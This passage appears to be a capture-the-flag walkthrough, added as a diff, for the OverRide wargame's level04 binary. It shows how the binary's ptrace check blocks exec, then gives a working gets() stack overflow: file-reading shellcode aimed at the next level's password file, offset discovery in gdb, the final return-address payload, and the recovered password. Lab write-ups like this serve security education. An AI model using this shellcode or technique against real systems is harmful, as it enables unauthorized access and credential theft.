@@ -1,0 +1,53 @@
+Running the binary :
+
+level04@OverRide:~$ ./level04 
+Give me some shellcode, k
+abc
+child is exiting...
+
+(gdb) i func
+
+0x080484b0  gets
+0x08048550  fork
+0x08048570  ptraceq
+
+The binary blocks any exec() system call.
+
+0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
+0x080487e1 <+281>:   mov    %eax,0xa8(%esp)
+0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)
+0x080487f0 <+296>:   jne    0x8048768 <main+160>
+0x080487f6 <+302>:   movl   $0x8048931,(%esp)
+0x080487fd <+309>:   call   0x8048500 <puts@plt>
+0x08048802 <+314>:   movl   $0x9,0x4(%esp)
+0x0804880a <+322>:   mov    0xac(%esp),%eax
+0x08048811 <+329>:   mov    %eax,(%esp)
+0x08048814 <+332>:   call   0x8048520 <kill@plt>
+
+The goal is then to overflow via gets() and use a shellcode to read the password directly.
+
+export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
+
+find the offset :
+
+echo "111122223333444455556666777788889999aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ1111222233334444555566667777888899990000" > /tmp/offset
+(gdb) set follow-fork-mode child (in order to find the offset, debug the child process as well)
+(gdb) r < /tmp/offset
+Give me some shellcode, k
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 2434]
+0x45454545 in ?? ()
+
+0x45454545 is "EEEE" which is offset 156.
+
+Let's find our shellcode's address :
+
+(gdb) x/1000wx $esp
+0xffffd840:     0x90909090      0x90909090      0x90909090      0x90909090
+
+Finally, run the payload.
+
+python -c "print 'A' * 156 + '\x40\xd8\xff\xff'" | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
